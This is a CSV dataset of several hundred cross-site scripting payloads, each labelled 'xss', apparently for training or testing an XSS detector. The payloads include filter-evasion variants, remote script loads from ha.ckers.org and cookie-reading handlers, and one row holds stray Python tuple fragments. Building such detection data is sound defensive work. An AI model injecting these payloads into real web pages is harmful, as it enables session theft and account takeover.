payload,label
"""`'><script>\xC2\xA0javascript:alert(1)</script>",xss
"""/><img/onerror=\x0Bjavascript:alert(1)\x0Bsrc=xxx:x />",xss
"""/><img/onerror=\x22javascript:alert(1)\x22src=xxx:x />",xss
"""/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />",xss
"""/><img/onerror=\x27javascript:alert(1)\x27src=xxx:x />",xss
"""/><img/onerror=\x0Ajavascript:alert(1)\x0Asrc=xxx:x />",xss
"""/><img/onerror=\x0Cjavascript:alert(1)\x0Csrc=xxx:x />",xss
"""/><img/onerror=\x0Djavascript:alert(1)\x0Dsrc=xxx:x />",xss
"""/><img/onerror=\x60javascript:alert(1)\x60src=xxx:x />",xss
"""/><img/onerror=\x20javascript:alert(1)\x20src=xxx:x />",xss
<script\x2F>javascript:alert(1)</script>,xss
<script\x20>javascript:alert(1)</script>,xss
<script\x0D>javascript:alert(1)</script>,xss
<script\x0A>javascript:alert(1)</script>,xss
<script\x0C>javascript:alert(1)</script>,xss
<script\x00>javascript:alert(1)</script>,xss
<script\x09>javascript:alert(1)</script>,xss
"`""'><img src=xxx:x onerror\x0B=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x00=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x0C=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x0D=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x20=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x0A=javascript:alert(1)>",xss
"`""'><img src=xxx:x onerror\x09=javascript:alert(1)>",xss
<script>javascript:alert(1)<\x00/script>,xss
"<img src=# onerror\x3D""javascript:alert(1)"" >",xss
<input onfocus=javascript:alert(1) autofocus>,xss
<input onblur=javascript:alert(1) autofocus><input autofocus>,xss
<video poster=javascript:javascript:alert(1)//,xss
<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>,xss
<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X,xss
"<video><source onerror=""javascript:javascript:alert(1)"">",xss
"<video onerror=""javascript:javascript:alert(1)""><source>",xss
"<form><button formaction=""javascript:javascript:alert(1)"">X",xss
<body oninput=javascript:alert(1)><input autofocus>,xss
"<math href=""javascript:javascript:alert(1)"">CLICKME</math>  <math> <maction actiontype=""statusline#http://google.com"" xlink:href=""javascript:javascript:alert(1)"">CLICKME</maction> </math>",xss
<frameset onload=javascript:alert(1)>,xss
"<table background=""javascript:javascript:alert(1)"">",xss
"<!--<img src=""--><img src=x onerror=javascript:alert(1)//"">",xss
"<comment><img src=""</comment><img src=x onerror=javascript:alert(1))//"">",xss
"<![><img src=""]><img src=x onerror=javascript:alert(1)//"">",xss
"<style><img src=""</style><img src=x onerror=javascript:alert(1)//"">",xss
"<li style=list-style:url() onerror=javascript:alert(1)> <div style=content:url(data:image/svg+xml,%%3Csvg/%%3E);visibility:hidden onload=javascript:alert(1)></div>",xss
"<head><base href=""javascript://""></head><body><a href=""/. /,javascript:alert(1)//#"">XXX</a></body>",xss
<SCRIPT FOR=document EVENT=onreadystatechange>javascript:alert(1)</SCRIPT>,xss
"<OBJECT CLASSID=""clsid:333C7BC4-460F-11D0-BC04-0080C7055A83""><PARAM NAME=""DataURL"" VALUE=""javascript:alert(1)""></OBJECT>",xss
"<object data=""data:text/html;base64,%(base64)s"">",xss
"<embed src=""data:text/html;base64,%(base64)s"">",xss
<b <script>alert(1)</script>0,xss
"<div id=""div1""><input value=""``onmouseover=javascript:alert(1)""></div> <div id=""div2""></div><script>document.getElementById(""div2"").innerHTML = document.getElementById(""div1"").innerHTML;</script>",xss
"<x '=""foo""><x foo='><img src=x onerror=javascript:alert(1)//'>",xss
"<embed src=""javascript:alert(1)"">",xss
"<img src=""javascript:alert(1)"">",xss
"<image src=""javascript:alert(1)"">",xss
"<script src=""javascript:alert(1)"">",xss
<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x,xss
"<? foo=""><script>javascript:alert(1)</script>"">",xss
"<! foo=""><script>javascript:alert(1)</script>"">",xss
"</ foo=""><script>javascript:alert(1)</script>"">",xss
"<? foo=""><x foo='?><script>javascript:alert(1)</script>'>"">",xss
"<! foo=""[[[Inception]]""><x foo=""]foo><script>javascript:alert(1)</script>"">",xss
"<% foo><x foo=""%><script>javascript:alert(1)</script>"">",xss
"<div id=d><x xmlns=""><iframe onload=javascript:alert(1)""></div> <script>d.innerHTML=d.innerHTML</script>",xss
"<img \x00src=x onerror=""alert(1)"">",xss
"<img \x47src=x onerror=""javascript:alert(1)"">",xss
"<img \x11src=x onerror=""javascript:alert(1)"">",xss
"<img \x12src=x onerror=""javascript:alert(1)"">",xss
"<img\x47src=x onerror=""javascript:alert(1)"">",xss
"<img\x10src=x onerror=""javascript:alert(1)"">",xss
"<img\x13src=x onerror=""javascript:alert(1)"">",xss
"<img\x32src=x onerror=""javascript:alert(1)"">",xss
"<img\x47src=x onerror=""javascript:alert(1)"">",xss
"<img\x11src=x onerror=""javascript:alert(1)"">",xss
"<img \x47src=x onerror=""javascript:alert(1)"">",xss
"<img \x34src=x onerror=""javascript:alert(1)"">",xss
"<img \x39src=x onerror=""javascript:alert(1)"">",xss
"<img \x00src=x onerror=""javascript:alert(1)"">",xss
"<img src\x09=x onerror=""javascript:alert(1)"">",xss
"<img src\x10=x onerror=""javascript:alert(1)"">",xss
"<img src\x13=x onerror=""javascript:alert(1)"">",xss
"<img src\x32=x onerror=""javascript:alert(1)"">",xss
"<img src\x12=x onerror=""javascript:alert(1)"">",xss
"<img src\x11=x onerror=""javascript:alert(1)"">",xss
"<img src\x00=x onerror=""javascript:alert(1)"">",xss
"<img src\x47=x onerror=""javascript:alert(1)"">",xss
"<img src=x\x09onerror=""javascript:alert(1)"">",xss
"<img src=x\x10onerror=""javascript:alert(1)"">",xss
"<img src=x\x11onerror=""javascript:alert(1)"">",xss
"<img src=x\x12onerror=""javascript:alert(1)"">",xss
"<img src=x\x13onerror=""javascript:alert(1)"">",xss
"<img[a][b][c]src[d]=x[e]onerror=[f]""alert(1)"">",xss
"<img src=x onerror=\x09""javascript:alert(1)"">",xss
"<img src=x onerror=\x10""javascript:alert(1)"">",xss
"<img src=x onerror=\x11""javascript:alert(1)"">",xss
"<img src=x onerror=\x12""javascript:alert(1)"">",xss
"<img src=x onerror=\x32""javascript:alert(1)"">",xss
"<img src=x onerror=\x00""javascript:alert(1)"">",xss
<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>XXX</a>,xss
"<img src=""x` `<script>javascript:alert(1)</script>""` `>",xss
"<img src onerror /"" '""= alt=javascript:alert(1)//"">",xss
<title onpropertychange=javascript:alert(1)></title><title title=>,xss
"<a href=http://foo.bar/#x=`y></a><img alt=""`><img src=x:x onerror=javascript:alert(1)></a>"">",xss
<!--[if]><script>javascript:alert(1)</script -->,xss
<!--[if<img src=x onerror=javascript:alert(1)//]> -->,xss
"<script src=""/\%(jscript)s""></script>",xss
"<script src=""\\%(jscript)s""></script>",xss
"<object id=""x"" classid=""clsid:CB927D12-4FF7-4a9e-A169-56E4B8A75598""></object> <object classid=""clsid:02BF25D5-8C17-4B23-BC80-D3488ABDDC6B"" onqt_error=""javascript:alert(1)"" style=""behavior:url(#x);""><param name=postdomevents /></object>",xss
"<a style=""-o-link:'javascript:javascript:alert(1)';-o-link-source:current"">X",xss
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>,xss
"<link rel=stylesheet href=data:,*%7bx:expression(javascript:alert(1))%7d",xss
"<style>@import ""data:,*%7bx:expression(javascript:alert(1))%7D"";</style>",xss
"<a style=""pointer-events:none;position:absolute;""><a style=""position:absolute;"" onclick=""javascript:alert(1);"">XXX</a></a><a href=""javascript:javascript:alert(1)"">XXX</a>",xss
<style>*[{}@import'%(css)s?]</style>X,xss
"<div style=""font-family:'foo&#10;;color:red;';"">XXX",xss
"<div style=""font-family:foo}color=red;"">XXX",xss
<// style=x:expression\28javascript:alert(1)\29>,xss
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>,xss
<div style=content:url(%(svg)s)></div>,xss
"<div style=""list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));"">X",xss
"<div id=d><div style=""font-family:'sans\27\3B color\3Ared\3B'"">X</div></div> <script>with(document.getElementById(""d""))innerHTML=innerHTML</script>",xss
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",xss
"<div style=""font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);"">X",xss
"<div id=""x"">XXX</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>",xss
"<x style=""background:url('x&#1;;color:red;/*')"">XXX</x>",xss
"<script>({set/**/$($){_/**/setter=$,_=javascript:alert(1)}}).$=eval</script>",xss
<script>({0:#0=eval/#0#/#0#(javascript:alert(1))})</script>,xss
"<script>ReferenceError.prototype.__defineGetter__('name', function(){javascript:alert(1)}),x</script>",xss
"<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('javascript:alert(1)')()</script>",xss
"<meta charset=""x-imap4-modified-utf7"">&ADz&AGn&AG0&AEf&ACA&AHM&AHI&AGO&AD0&AGn&ACA&AG8Abg&AGUAcgByAG8AcgA9AGEAbABlAHIAdAAoADEAKQ&ACAAPABi",xss
"<meta charset=""x-imap4-modified-utf7"">&<script&S1&TS&1>alert&A7&(1)&R&UA;&&<&A9&11/script&X&>",xss
"<meta charset=""mac-farsi"">¼script¾javascript:alert(1)¼/script¾",xss
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >,xss
1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`&lt;img/src=&quot;x&quot;onerror=javascript:alert(1)&gt;`>,xss
1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=javascript:alert(1)&gt;>,xss
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>,xss
1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>,xss
"<a style=""behavior:url(#default#AnchorClick);"" folder=""javascript:javascript:alert(1)"">XXX</a>",xss
"<x style=""behavior:url(%(sct)s)"">",xss
"<xml id=""xss"" src=""%(htc)s""></xml> <label dataformatas=""html"" datasrc=""#xss"" datafld=""payload""></label>",xss
"<event-source src=""%(event)s"" onload=""javascript:alert(1)"">",xss
"<a href=""javascript:javascript:alert(1)""><event-source src=""data:application/x-dom-event-stream,Event:click%0Adata:XXX%0A%0A"">",xss
"<div id=""x"">x</div> <xml:namespace prefix=""t""> <import namespace=""t"" implementation=""#default#time2""> <t:set attributeName=""innerHTML"" targetElement=""x"" to=""&lt;img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)&gt;"">",xss
<script>%(payload)s</script>,xss
<script src=%(jscript)s></script>,xss
<script language='javascript' src='%(jscript)s'></script>,xss
<script>javascript:alert(1)</script>,xss
"<IMG SRC=""javascript:javascript:alert(1);"">",xss
<IMG SRC=javascript:javascript:alert(1)>,xss
<IMG SRC=`javascript:javascript:alert(1)`>,xss
<SCRIPT SRC=%(jscript)s?<B>,xss
"<FRAMESET><FRAME SRC=""javascript:javascript:alert(1);""></FRAMESET>",xss
<BODY ONLOAD=javascript:alert(1)>,xss
<BODY ONLOAD=javascript:javascript:alert(1)>,xss
"<IMG SRC=""jav    ascript:javascript:alert(1);"">",xss
"<BODY onload!#$%%&()*~+-_.,:;?@[/|\]^`=javascript:alert(1)>",xss
"<SCRIPT/SRC=""%(jscript)s""></SCRIPT>",xss
<<SCRIPT>%(payload)s//<</SCRIPT>,xss
"<IMG SRC=""javascript:javascript:alert(1)""",xss
<iframe src=%(scriptlet)s <,xss
"<INPUT TYPE=""IMAGE"" SRC=""javascript:javascript:alert(1);"">",xss
"<IMG DYNSRC=""javascript:javascript:alert(1)"">",xss
"<IMG LOWSRC=""javascript:javascript:alert(1)"">",xss
"<BGSOUND SRC=""javascript:javascript:alert(1);"">",xss
"<BR SIZE=""&{javascript:alert(1)}"">",xss
"<LAYER SRC=""%(scriptlet)s""></LAYER>",xss
"<LINK REL=""stylesheet"" HREF=""javascript:javascript:alert(1);"">",xss
<STYLE>@import'%(css)s';</STYLE>,xss
"<META HTTP-EQUIV=""Link"" Content=""<%(css)s>; REL=stylesheet"">",xss
"<XSS STYLE=""behavior: url(%(htc)s);"">",xss
"<STYLE>li {list-style-image: url(""javascript:javascript:alert(1)"");}</STYLE><UL><LI>XSS",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0;url=javascript:javascript:alert(1);"">",xss
"<META HTTP-EQUIV=""refresh"" CONTENT=""0; URL=http://;URL=javascript:javascript:alert(1);"">",xss
"<IFRAME SRC=""javascript:javascript:alert(1);""></IFRAME>",xss
"<TABLE BACKGROUND=""javascript:javascript:alert(1)"">",xss
"<TABLE><TD BACKGROUND=""javascript:javascript:alert(1)"">",xss
"<DIV STYLE=""background-image: url(javascript:javascript:alert(1))"">",xss
"<DIV STYLE=""width:expression(javascript:alert(1));"">",xss
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(1))"">",xss
"<XSS STYLE=""xss:expression(javascript:alert(1))"">",xss
"<STYLE TYPE=""text/javascript"">javascript:alert(1);</STYLE>",xss
"<STYLE>.XSS{background-image:url(""javascript:javascript:alert(1)"");}</STYLE><A CLASS=XSS></A>",xss
"<STYLE type=""text/css"">BODY{background:url(""javascript:javascript:alert(1)"")}</STYLE>",xss
<!--[if gte IE 4]><SCRIPT>javascript:alert(1);</SCRIPT><![endif]-->,xss
"<BASE HREF=""javascript:javascript:alert(1);//"">",xss
"<OBJECT TYPE=""text/x-scriptlet"" DATA=""%(scriptlet)s""></OBJECT>",xss
<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:javascript:alert(1)></OBJECT>,xss
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""%(htc)s""><xss:xss>XSS</xss:xss></HTML>"""""",""XML namespace.""),(""""""<XML ID=""xss""><I><B>&lt;IMG SRC=""javas<!-- -->cript:javascript:alert(1)""&gt;</B></I></XML><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN>",xss
"<HTML><BODY><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributeName=""innerHTML"" to=""XSS&lt;SCRIPT DEFER&gt;javascript:alert(1)&lt;/SCRIPT&gt;""></BODY></HTML>",xss
"<SCRIPT SRC=""%(jpg)s""></SCRIPT>",xss
"<HEAD><META HTTP-EQUIV=""CONTENT-TYPE"" CONTENT=""text/html; charset=UTF-7""> </HEAD>+ADw-SCRIPT+AD4-%(payload)s;+ADw-/SCRIPT+AD4-",xss
"<form id=""test"" /><button form=""test"" formaction=""javascript:javascript:alert(1)"">X",xss
<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>,xss
"<P STYLE=""behavior:url('#default#time2')"" end=""0"" onEnd=""javascript:alert(1)"">",xss
<STYLE>@import'%(css)s';</STYLE>,xss
<STYLE>a{background:url('s1' 's2)}@import javascript:javascript:alert(1);');}</STYLE>,xss
"<meta charset= ""x-imap4-modified-utf7""&&>&&<script&&>javascript:alert(1)&&;&&<&&/script&&>",xss
<SCRIPT onreadystatechange=javascript:javascript:alert(1);></SCRIPT>,xss
<style onreadystatechange=javascript:javascript:alert(1);></style>,xss
"<?xml version=""1.0""?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>javascript:alert(1);</html:script></html:html>",xss
<embed code=%(scriptlet)s></embed>,xss
<embed code=javascript:javascript:alert(1);></embed>,xss
<embed src=%(jscript)s></embed>,xss
<frameset onload=javascript:javascript:alert(1)></frameset>,xss
<object onerror=javascript:javascript:alert(1)>,xss
"<embed type=""image"" src=%(scriptlet)s></embed>",xss
"<XML ID=I><X><C><![CDATA[<IMG SRC=""javas]]<![CDATA[cript:javascript:alert(1);"">]]</C><X></xml>",xss
<IMG SRC=&{javascript:alert(1);};>,xss
"<a href=""jav&#65ascript:javascript:alert(1)"">test1</a>",xss
"<a href=""jav&#97ascript:javascript:alert(1)"">test1</a>",xss
"<embed width=500 height=500 code=""data:text/html,<script>%(payload)s</script>""></embed>",xss
"<iframe srcdoc=""&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;>"">",xss
"';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"";",xss
"alert(String.fromCharCode(88,83,83))//"";alert(String.fromCharCode(88,83,83))//--",xss
"></SCRIPT>"">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",xss
"'';!--""<XSS>=&{()}",xss
<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>,xss
"<IMG SRC=""javascript:alert('XSS');"">",xss
<IMG SRC=javascript:alert('XSS')>,xss
<IMG SRC=JaVaScRiPt:alert('XSS')>,xss
"<IMG SRC=javascript:alert(""XSS"")>",xss
"<IMG SRC=`javascript:alert(""RSnake says, 'XSS'"")`>",xss
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",xss
<a onmouseover=alert(document.cookie)>xxs link</a>,xss
"<IMG """"""><SCRIPT>alert(""XSS"")</SCRIPT>"">",xss
"<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>",xss
"<IMG SRC=# onmouseover=""alert('xxs')"">",xss
"<IMG SRC= onmouseover=""alert('xxs')"">",xss
"<IMG onmouseover=""alert('xxs')"">",xss
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,xss
<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>,xss
<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>,xss
"<IMG SRC=""jav	ascript:alert('XSS');"">",xss
"<IMG SRC=""jav&#x09;ascript:alert('XSS');"">",xss
"<IMG SRC=""jav&#x0A;ascript:alert('XSS');"">",xss
"<IMG SRC=""jav&#x0D;ascript:alert('XSS');"">",xss
"perl -e 'print ""<IMG SRC=java\0script:alert(\""XSS\"")>"";' > out",xss
"<IMG SRC="" &#14;  javascript:alert('XSS');"">",xss
"<SCRIPT/XSS SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=alert(""XSS"")>",xss
"<SCRIPT/SRC=""http://ha.ckers.org/xss.js""></SCRIPT>",xss
"<<SCRIPT>alert(""XSS"");//<</SCRIPT>",xss
<SCRIPT SRC=http://ha.ckers.org/xss.js?< B >,xss
<SCRIPT SRC=//ha.ckers.org/.j>,xss
"<IMG SRC=""javascript:alert('XSS')""",xss
<iframe src=http://ha.ckers.org/scriptlet.html <,xss
"\"";alert('XSS');//",xss
"</TITLE><SCRIPT>alert(""XSS"");</SCRIPT>",xss
"<INPUT TYPE=""IMAGE"" SRC=""javascript:alert('XSS');"">",xss
"<BODY BACKGROUND=""javascript:alert('XSS')"">",xss
"<IMG DYNSRC=""javascript:alert('XSS')"">",xss
"<IMG LOWSRC=""javascript:alert('XSS')"">",xss
"<STYLE>li {list-style-image: url(""javascript:alert('XSS')"");}</STYLE><UL><LI>XSS</br>",xss
"<IMG SRC='vbscript:msgbox(""XSS"")'>",xss
"<IMG SRC=""livescript:[code]"">",xss
<BODY ONLOAD=alert('XSS')>,xss
"<BGSOUND SRC=""javascript:alert('XSS');"">",xss
"<BR SIZE=""&{alert('XSS')}"">",xss
"<LINK REL=""stylesheet"" HREF=""javascript:alert('XSS');"">",xss
"<LINK REL=""stylesheet"" HREF=""http://ha.ckers.org/xss.css"">",xss
<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>,xss
"<META HTTP-EQUIV=""Link"" Content=""<http://ha.ckers.org/xss.css>; REL=stylesheet"">",xss
"<STYLE>BODY{-moz-binding:url(""http://ha.ckers.org/xssmoz.xml#xss"")}</STYLE>",xss
"<STYLE>@im\port'\ja\vasc\ript:alert(""XSS"")';</STYLE>",xss
"<IMG STYLE=""xss:expr/*XSS*/ession(alert('XSS'))"">",xss
"exp/*<A STYLE='no\xss:noxss(""*//*"");xss:ex/*XSS*//*/*/pression(alert(""XSS""))'>",xss
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",xss
"<STYLE>.XSS{background-image:url(""javascript:alert('XSS')"");}</STYLE><A CLASS=XSS></A>",xss
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"<STYLE type=""text/css"">BODY{background:url(""javascript:alert('XSS')"")}</STYLE>",xss
"<XSS STYLE=""xss:expression(alert('XSS'))"">",xss
"<XSS STYLE=""behavior: url(xss.htc);"">",xss
¼script¾alert(¢XSS¢)¼/script¾,xss
